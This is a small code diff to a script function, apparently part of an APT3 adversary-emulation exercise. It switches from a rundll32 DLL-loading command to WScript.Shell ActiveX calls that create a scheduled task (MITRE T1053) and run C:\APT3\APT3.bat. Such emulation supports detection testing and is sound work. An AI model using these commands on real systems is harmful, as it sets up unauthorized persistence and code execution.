@@ -35,9 +35,8 @@
 
 	function Exec()
 	{
-		<!-- var r = new ActiveXObject("WScript.Shell").Run("SCHTASKS /Create /SC ONCE /TN T1053 /TR C:\\APT3\\APT3.bat /ST 00:30"); -->
-		<!-- var s = new ActiveXObject("WScript.Shell").Run("C:\\APT3\\APT3.bat"); -->		
-		var r = new ActiveXObject("WScript.Shell").Run("rundll32.exe shell32.dll,Control_RunDLL \\127.0.0.1\C$\Windows\System32\wbem\wbemcomn.dll");
+		var r = new ActiveXObject("WScript.Shell").Run("SCHTASKS /Create /SC ONCE /TN T1053 /TR C:\\APT3\\APT3.bat /ST 00:30");
+		var s = new ActiveXObject("WScript.Shell").Run("C:\\APT3\\APT3.bat");
 
 	}
 
